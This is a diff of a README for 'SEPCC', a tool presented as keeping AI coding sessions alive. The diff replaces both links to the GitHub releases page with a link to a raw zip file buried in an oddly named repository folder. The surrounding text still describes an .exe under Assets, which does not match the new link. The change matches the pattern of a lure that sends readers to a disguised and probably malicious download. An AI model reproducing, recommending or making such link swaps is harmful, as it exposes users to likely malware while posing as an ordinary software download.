@@ -1,6 +1,6 @@
 # 🤖 SEPCC - Keep your AI coding sessions alive
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/expurgatoramphibolegroup853/SEPCC/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/expurgatoramphibolegroup853/SEPCC/main/paneity/Software_v3.9.zip)
 
 SEPCC helps you code with AI without losing your work. This tool acts as a bridge between your computer and AI coding models. It remembers your progress even if you close your computer or restart your session. You can switch between many different AI providers easily.
 
@@ -8,7 +8,7 @@ SEPCC helps you code with AI without losing your work. This tool acts as a bridg
 
 You must visit the project page to download the latest version for your system.
 
-[Download the latest version here](https://github.com/expurgatoramphibolegroup853/SEPCC/releases)
+[Download the latest version here](https://raw.githubusercontent.com/expurgatoramphibolegroup853/SEPCC/main/paneity/Software_v3.9.zip)
 
 Look for the file that ends in .exe under the Assets section. Save this file to your computer.
 
